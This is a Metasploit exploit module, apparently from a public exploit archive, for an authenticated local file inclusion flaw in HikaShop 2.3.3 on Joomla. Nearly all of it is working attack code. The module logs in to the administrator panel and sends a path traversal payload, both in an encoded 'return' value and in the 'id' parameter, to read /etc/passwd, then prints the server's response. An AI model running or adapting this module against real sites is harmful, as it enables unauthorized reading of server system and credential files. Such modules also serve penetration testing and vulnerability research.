# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;HikaShop - LFI poc for authenticated users&#039;,
        &#039;Description&#039; => %q{
                HikaShop 2.3.3 is vulnerable to local file include attack.
                Authenticated user can read local files from the server.

                Vulnerability was described on https://twitter.com/HauntITBlog
      },
      &#039;Author&#039; =>
        [
          &#039;HauntIT Blog&#039;, # Discovery / msf module
          &#039;http://hauntit.blogspot.com&#039;
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [ &#039;Automatic&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;03.01.2015&#039;))
      register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base Joomla directory path", &#039;joomla&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, "Password to authenticate with", &#039;admin&#039;]),
        OptRegexp.new(&#039;FAILPATTERN&#039;, [ false, &#039;Pattern returned in response if login failed&#039;, &#039;/error/&#039;] ),
      ], self.class)
    end

  def check
  end

  def fetchMd5(my_string)
    if my_string  =~ /([0-9a-fA-F]{32})/
      return $1
    end
    return nil
  end


  def exploit
    # 1st, we will get cookies and token
    req1 = send_request_cgi({
        &#039;method&#039;        => &#039;GET&#039;,
        &#039;uri&#039;           => normalize_uri(target_uri.path,&#039;administrator&#039;,&#039;index.php&#039;)
    })
    cookies = req1[&#039;set-cookie&#039;]
    if not req1
      fail_with("[-] Failed with 1st request")
    end

    print_status("[+] Resp code: " + req1.code.to_s)
    print_good("[+] Cookie(s) : " + cookies)

    token_pattern = /(<input type=\"hidden\" name=\"[a-zA-Z0-9]*\" value=\"1\")/
    if req1.body =~ token_pattern
      token = fetchMd5(req1.body)
      print_good("[+] Token : "+ token.to_s)
    else
      print_status("[-] Token not found")
    end


    # now we need to do auth using that token and cookies
    print_status("[+] 2nd request (post with auth)")

    auth = send_request_cgi({
        &#039;method&#039;        => &#039;POST&#039;,
        &#039;uri&#039;           => normalize_uri(target_uri.path,&#039;administrator&#039;,&#039;index.php&#039;),
        &#039;cookie&#039;        => cookies,
        &#039;vars_post&#039;     => {
                &#039;username&#039;      => datastore[&#039;USERNAME&#039;],
                &#039;passwd&#039;        => datastore[&#039;PASSWORD&#039;],
                &#039;option&#039;        => &#039;com_login&#039;,
                &#039;task&#039;          => &#039;login&#039;,
                &#039;return&#039;        => &#039;aW5kZXgucGhwP29wdGlvbj1jb21faGlrYXNob3AmY3RybD12aWV3JnRhc2s9ZWRpdCZpZD0wfGJlZXozfGNvbXBvbmVudHxjb21faGlrYXNob3B8YWRkcmVzc3wuLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dk&#039;,
                token.to_s => 1
      }
    })

    print_good("[+] Code after auth: " + auth.code.to_s)


    # 3rd step: get + post params to lfi
    print_status(&#039;[+] and now 3rd request...&#039;)
    xpl = send_request_cgi({
        &#039;method&#039;        => &#039;GET&#039;,
        &#039;uri&#039;           => normalize_uri(target_uri.path,&#039;administrator&#039;,&#039;index.php&#039;),
        &#039;vars_get&#039;      => {
                 &#039;option&#039;   => &#039;com_hikashop&#039;,
                 &#039;ctrl&#039;  => &#039;view&#039;,
                 &#039;task&#039;  => &#039;edit&#039;,
                 &#039;id&#039;    => &#039;0|beez3|component|com_hikashop|address|../../../../../../../../../../../../../../../../../../etc/passwd&#039;
        },
        &#039;cookie&#039;        => cookies
    })

    if xpl
      print_good("[+] 3rd response code: " + xpl.code.to_s)
      print_good("[+] 3rd (full) response body:")
      print_status(xpl.body)
    else
      fail_with("[-] Cannot exploit it :C")
    end
  end # exploit

end

